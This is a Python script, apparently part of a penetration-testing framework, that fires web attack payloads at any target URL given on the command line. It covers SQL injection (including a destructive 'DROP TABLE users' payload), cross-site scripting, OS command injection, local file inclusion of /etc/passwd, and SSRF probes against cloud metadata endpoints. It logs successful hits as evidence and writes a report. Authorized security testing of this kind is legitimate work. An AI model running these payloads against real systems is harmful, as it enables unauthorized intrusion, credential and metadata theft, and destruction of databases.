#!/usr/bin/env python3
"""
Proof of Concept (PoC) Exploitation Module
Advanced Penetration Testing Framework - Exploitation Demonstrations
Author: Security Research Team
"""

import requests
import json
import time
import urllib.parse
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

class PoCExploitation:
    def __init__(self):
        self.session = requests.Session()
        self.proxies = {}
        self.timeout = 10
        self.results = []
        
    def banner(self):
        print(f"{Fore.CYAN}")
        print("=" * 60)
        print("    Proof of Concept (PoC) Exploitation Module")
        print("    Advanced Penetration Testing Framework")
        print("=" * 60)
        print(f"{Style.RESET_ALL}")
    
    def log_success(self, message):
        print(f"{Fore.GREEN}[+] {message}")
    
    def log_info(self, message):
        print(f"{Fore.BLUE}[*] {message}")
    
    def log_warning(self, message):
        print(f"{Fore.YELLOW}[!] {message}")
    
    def log_error(self, message):
        print(f"{Fore.RED}[-] {message}")
    
    def save_poc_evidence(self, title, description, target, payload, response, severity="High"):
        """Save proof of concept evidence"""
        poc_data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "title": title,
            "description": description,
            "target": target,
            "payload": payload,
            "response_snippet": response[:500] if len(response) > 500 else response,
            "severity": severity,
            "poc_type": "exploitation"
        }
        self.results.append(poc_data)
        
        # Save to file
        filename = f"poc_evidence_{int(time.time())}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(poc_data, f, indent=2, ensure_ascii=False)
        
        self.log_success(f"PoC evidence saved to {filename}")
    
    def sql_injection_poc(self, target_url, parameter="id"):
        """SQL Injection Proof of Concept"""
        self.log_info(f"Testing SQL Injection on {target_url}")
        
        # Test payloads
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null,null,null--",
            "'; DROP TABLE users;--",
            "' OR SLEEP(5)--"
        ]
        
        vulnerable = False
        for payload in payloads:
            try:
                test_url = f"{target_url}?{parameter}={urllib.parse.quote(payload)}"
                start_time = time.time()
                response = self.session.get(test_url, timeout=self.timeout)
                response_time = time.time() - start_time
                
                # Check for SQL error patterns
                sql_errors = [
                    "mysql_fetch_array",
                    "ORA-",
                    "Microsoft OLE DB Provider",
                    "SQLServer JDBC Driver",
                    "PostgreSQL query failed",
                    "Warning: mysql_",
                    "SQLite error"
                ]
                
                if any(error in response.text.lower() for error in sql_errors):
                    self.log_success(f"SQL Injection vulnerability found with payload: {payload}")
                    self.save_poc_evidence(
                        "SQL Injection Vulnerability",
                        f"SQL injection vulnerability detected in parameter '{parameter}'",
                        target_url,
                        payload,
                        response.text,
                        "Critical"
                    )
                    vulnerable = True
                    break
                
                # Check for time-based SQL injection
                if response_time > 4.5 and "SLEEP" in payload:
                    self.log_success(f"Time-based SQL Injection found with payload: {payload}")
                    self.save_poc_evidence(
                        "Time-based SQL Injection",
                        "Time-based blind SQL injection vulnerability detected",
                        target_url,
                        payload,
                        f"Response time: {response_time:.2f} seconds",
                        "Critical"
                    )
                    vulnerable = True
                    break
                    
            except Exception as e:
                self.log_error(f"Error testing payload {payload}: {str(e)}")
        
        if not vulnerable:
            self.log_warning("No SQL Injection vulnerability detected")
        
        return vulnerable
    
    def xss_poc(self, target_url, parameter="input"):
        """Cross-Site Scripting (XSS) Proof of Concept"""
        self.log_info(f"Testing XSS on {target_url}")
        
        # XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "' onmouseover=alert('XSS') '",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]
        
        vulnerable = False
        for payload in payloads:
            try:
                test_url = f"{target_url}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check if payload is reflected in response
                if payload in response.text:
                    self.log_success(f"XSS vulnerability found with payload: {payload}")
                    self.save_poc_evidence(
                        "Cross-Site Scripting (XSS)",
                        f"Reflected XSS vulnerability in parameter '{parameter}'",
                        target_url,
                        payload,
                        response.text[:1000],
                        "High"
                    )
                    vulnerable = True
                    break
                    
            except Exception as e:
                self.log_error(f"Error testing XSS payload: {str(e)}")
        
        if not vulnerable:
            self.log_warning("No XSS vulnerability detected")
        
        return vulnerable
    
    def command_injection_poc(self, target_url, parameter="cmd"):
        """Command Injection Proof of Concept"""
        self.log_info(f"Testing Command Injection on {target_url}")
        
        # Command injection payloads
        payloads = [
            "; id",
            "| id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "&& whoami"
        ]
        
        vulnerable = False
        for payload in payloads:
            try:
                test_url = f"{target_url}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for command execution indicators
                command_indicators = [
                    "uid=",
                    "gid=",
                    "groups=",
                    "root",
                    "administrator",
                    "windows\\system32"
                ]
                
                if any(indicator in response.text.lower() for indicator in command_indicators):
                    self.log_success(f"Command injection found with payload: {payload}")
                    self.save_poc_evidence(
                        "Command Injection Vulnerability",
                        f"OS command injection in parameter '{parameter}'",
                        target_url,
                        payload,
                        response.text,
                        "Critical"
                    )
                    vulnerable = True
                    break
                    
            except Exception as e:
                self.log_error(f"Error testing command injection: {str(e)}")
        
        if not vulnerable:
            self.log_warning("No command injection vulnerability detected")
        
        return vulnerable
    
    def lfi_poc(self, target_url, parameter="file"):
        """Local File Inclusion (LFI) Proof of Concept"""
        self.log_info(f"Testing LFI on {target_url}")
        
        # LFI payloads
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        vulnerable = False
        for payload in payloads:
            try:
                test_url = f"{target_url}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for file content indicators
                file_indicators = [
                    "root:x:",
                    "daemon:x:",
                    "bin:x:",
                    "127.0.0.1",
                    "localhost",
                    "# Copyright",
                    "PD9waHA="  # Base64 encoded "<?php"
                ]
                
                if any(indicator in response.text for indicator in file_indicators):
                    self.log_success(f"LFI vulnerability found with payload: {payload}")
                    self.save_poc_evidence(
                        "Local File Inclusion (LFI)",
                        f"LFI vulnerability in parameter '{parameter}'",
                        target_url,
                        payload,
                        response.text[:1500],
                        "High"
                    )
                    vulnerable = True
                    break
                    
            except Exception as e:
                self.log_error(f"Error testing LFI: {str(e)}")
        
        if not vulnerable:
            self.log_warning("No LFI vulnerability detected")
        
        return vulnerable
    
    def ssrf_poc(self, target_url, parameter="url"):
        """Server-Side Request Forgery (SSRF) Proof of Concept"""
        self.log_info(f"Testing SSRF on {target_url}")
        
        # SSRF payloads
        payloads = [
            "http://localhost:80",
            "http://127.0.0.1:80",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
            "file:///etc/passwd",
            "dict://localhost:11211",  # Memcached
            "gopher://localhost:70",
            "ftp://localhost:21"
        ]
        
        vulnerable = False
        for payload in payloads:
            try:
                test_url = f"{target_url}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for SSRF indicators
                ssrf_indicators = [
                    "ami-id",
                    "instance-id",
                    "public-hostname",
                    "public-ipv4",
                    "local-ipv4",
                    "placement/",
                    "ami-launch-index",
                    "root:x:",
                    "Welcome to nginx",
                    "Apache2 Ubuntu",
                    "It works!"
                ]
                
                if any(indicator in response.text for indicator in ssrf_indicators):
                    self.log_success(f"SSRF vulnerability found with payload: {payload}")
                    self.save_poc_evidence(
                        "Server-Side Request Forgery (SSRF)",
                        f"SSRF vulnerability in parameter '{parameter}'",
                        target_url,
                        payload,
                        response.text[:1000],
                        "Critical"
                    )
                    vulnerable = True
                    break
                    
            except Exception as e:
                self.log_error(f"Error testing SSRF: {str(e)}")
        
        if not vulnerable:
            self.log_warning("No SSRF vulnerability detected")
        
        return vulnerable
    
    def generate_poc_report(self):
        """Generate comprehensive PoC report"""
        self.log_info("Generating PoC exploitation report")
        
        report_content = f"""
# Proof of Concept Exploitation Report

**Generated:** {time.strftime("%Y-%m-%d %H:%M:%S")}
**Total PoCs Conducted:** {len(self.results)}

## Executive Summary

This report documents the proof of concept exploitation attempts conducted during the security assessment. Each PoC demonstrates the practical exploitability of identified vulnerabilities.

## PoC Results Summary

"""
        
        for i, result in enumerate(self.results, 1):
            report_content += f"""
### PoC #{i}: {result['title']}

- **Severity:** {result['severity']}
- **Target:** {result['target']}
- **Description:** {result['description']}
- **Payload Used:** `{result['payload']}`
- **Timestamp:** {result['timestamp']}

**Response Snippet:**
```
{result['response_snippet']}
```

---
"""
        
        report_content += """
## Recommendations

1. **Immediate Actions:**
   - Patch all confirmed vulnerabilities
   - Implement input validation and sanitization
   - Deploy Web Application Firewall (WAF)

2. **Long-term Solutions:**
   - Conduct regular security assessments
   - Implement secure coding practices
   - Provide developer security training

3. **Monitoring:**
   - Deploy intrusion detection systems
   - Monitor for exploitation attempts
   - Establish incident response procedures

## Disclaimer

This report contains proof of concept exploitation results conducted during authorized security testing. All tests were performed within the defined scope and rules of engagement.
"""
        
        # Save report
        report_filename = f"poc_report_{int(time.time())}.md"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(report_content)
        
        self.log_success(f"PoC report saved to {report_filename}")
        return report_filename
    
    def run_comprehensive_poc(self, target_url):
        """Run comprehensive PoC testing"""
        self.banner()
        self.log_info(f"Starting comprehensive PoC testing on {target_url}")
        
        # Test for different vulnerability types
        vuln_count = 0
        
        # SQL Injection PoC
        if self.sql_injection_poc(target_url):
            vuln_count += 1
        
        # XSS PoC
        if self.xss_poc(target_url):
            vuln_count += 1
        
        # Command Injection PoC
        if self.command_injection_poc(target_url):
            vuln_count += 1
        
        # LFI PoC
        if self.lfi_poc(target_url):
            vuln_count += 1
        
        # SSRF PoC
        if self.ssrf_poc(target_url):
            vuln_count += 1
        
        self.log_info(f"PoC testing completed. Found {vuln_count} exploitable vulnerabilities")
        
        # Generate comprehensive report
        report_file = self.generate_poc_report()
        
        return vuln_count, report_file

def main():
    """Main function for standalone usage"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Proof of Concept Exploitation Module")
    parser.add_argument("--target", "-t", required=True, help="Target URL for PoC testing")
    parser.add_argument("--test-type", choices=["sql", "xss", "command", "lfi", "ssrf", "all"], 
                       default="all", help="Type of vulnerability to test")
    parser.add_argument("--parameter", "-p", default="input", help="Parameter to test")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--proxy", help="Proxy server (http://proxy:port)")
    
    args = parser.parse_args()
    
    # Initialize PoC exploitation
    poc = PoCExploitation()
    poc.timeout = args.timeout
    
    if args.proxy:
        poc.proxies = {"http": args.proxy, "https": args.proxy}
    
    if args.test_type == "all":
        vuln_count, report_file = poc.run_comprehensive_poc(args.target)
        print(f"\n{Fore.GREEN}PoC testing completed!")
        print(f"Vulnerabilities found: {vuln_count}")
        print(f"Report saved: {report_file}")
    else:
        poc.banner()
        
        if args.test_type == "sql":
            poc.sql_injection_poc(args.target, args.parameter)
        elif args.test_type == "xss":
            poc.xss_poc(args.target, args.parameter)
        elif args.test_type == "command":
            poc.command_injection_poc(args.target, args.parameter)
        elif args.test_type == "lfi":
            poc.lfi_poc(args.target, args.parameter)
        elif args.test_type == "ssrf":
            poc.ssrf_poc(args.target, args.parameter)

if __name__ == "__main__":
    main()